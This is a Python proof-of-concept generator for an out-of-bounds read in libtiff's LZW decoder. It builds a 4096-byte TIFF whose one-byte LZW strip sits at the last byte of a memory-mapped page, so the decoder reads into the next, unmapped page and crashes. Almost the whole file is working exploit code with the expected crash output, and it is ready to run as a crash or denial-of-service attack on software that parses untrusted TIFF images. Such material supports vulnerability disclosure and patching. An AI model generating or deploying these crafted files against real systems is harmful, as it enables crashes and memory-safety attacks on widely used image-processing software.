#!/usr/bin/env python3
"""
PoC generator for VULN 001: LZWPreDecode OOB Read via 1-Byte LZW Strip at mmap EOF

Vulnerability: LZWPreDecode() in tif_lzw.c line 268:
    if (tif->tif_rawdata[0] == 0 && (tif->tif_rawdata[1] & 0x1)) {
reads rawdata[1] without checking rawcc (strip size). When StripByteCount=1 and
rawdata[0]==0x00, rawdata[1] is accessed out-of-bounds.

KEY: On Linux, mmap pads the last partial page with zeros.  rawdata[1] is NOT a
crash UNLESS the file ends on an exact page boundary, so that rawdata[1] lands
on the NEXT (unmapped) page.

File layout (exactly 4096 bytes = one OS page):
  Offset  0-7:    TIFF header (little-endian, magic=42, IFD at offset 8)
  Offset  8-121:  IFD (2 + 9*12 + 4 = 114 bytes)
  Offset  122-4094: zero-padding (3973 bytes)
  Offset  4095:   strip data: single byte 0x00  (= file_size - 1)

With file_size == PAGE_SIZE (4096):
  tif_rawdata = tif_base + 4095            (last byte of the mapped page)
  rawdata[0]  = 0x00  => condition is true
  rawdata[1]  = tif_base + 4096            (FIRST BYTE OF UNMAPPED PAGE) => SIGSEGV / OOB
"""

import struct
import os

PAGE_SIZE = 4096

def make_tiff():
    header_size = 8
    num_tags    = 9
    ifd_size    = 2 + num_tags * 12 + 4   # 114 bytes
    ifd_end     = header_size + ifd_size   # 122

    # Strip byte must be at offset PAGE_SIZE - 1 = 4095
    strip_data_offset = PAGE_SIZE - 1      # 4095
    file_size         = PAGE_SIZE          # 4096

    pad_size = strip_data_offset - ifd_end  # 4095 - 122 = 3973

    # TIFF Header
    header  = b'II'
    header += struct.pack('<H', 42)
    header += struct.pack('<I', header_size)   # IFD at offset 8

    # IFD entries (sorted by tag number)
    entries = []
    entries.append(struct.pack('<HHII', 256, 4, 1, 1))               # ImageWidth=1
    entries.append(struct.pack('<HHII', 257, 4, 1, 1))               # ImageLength=1
    entries.append(struct.pack('<HHII', 258, 3, 1, 8))               # BitsPerSample=8
    entries.append(struct.pack('<HHII', 259, 3, 1, 5))               # Compression=5 (LZW)
    entries.append(struct.pack('<HHII', 262, 3, 1, 1))               # PhotometricInterp=1
    entries.append(struct.pack('<HHII', 273, 4, 1, strip_data_offset)) # StripOffsets → last byte
    entries.append(struct.pack('<HHII', 277, 3, 1, 1))               # SamplesPerPixel=1
    entries.append(struct.pack('<HHII', 278, 4, 1, 1))               # RowsPerStrip=1
    entries.append(struct.pack('<HHII', 279, 4, 1, 1))               # StripByteCounts=1

    ifd  = struct.pack('<H', num_tags)
    for e in entries:
        ifd += e
    ifd += struct.pack('<I', 0)   # next IFD = 0

    # Padding + strip byte
    padding    = b'\x00' * pad_size
    strip_data = b'\x00'          # rawdata[0] == 0x00 triggers rawdata[1] access

    tiff_data = header + ifd + padding + strip_data

    # Assertions
    assert len(tiff_data) == file_size, \
        f"Size mismatch: got {len(tiff_data)}, expected {file_size}"
    assert len(tiff_data) % PAGE_SIZE == 0, \
        f"File size must be exact multiple of page size for the OOB to cross a page boundary"
    assert tiff_data[strip_data_offset] == 0x00, \
        "Strip byte must be 0x00"

    return tiff_data, strip_data_offset, file_size


if __name__ == '__main__':
    out_dir  = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_001.tif')

    data, strip_off, fsize = make_tiff()

    with open(out_path, 'wb') as f:
        f.write(data)

    print(f"[+] Written: {out_path}")
    print(f"    File size        : {fsize} bytes  (= {fsize // 4096} page(s) exactly)")
    print(f"    StripOffset      : {strip_off}  (= file_size - 1 = {fsize - 1})")
    print(f"    StripByteCount   : 1")
    print(f"    Strip byte value : 0x{data[strip_off]:02x}")
    print(f"[+] rawdata[0] = 0x00 at the last byte of the mmap'd page.")
    print(f"    rawdata[1] = byte at mmap offset {fsize} => UNMAPPED => SIGSEGV / OOB Read")
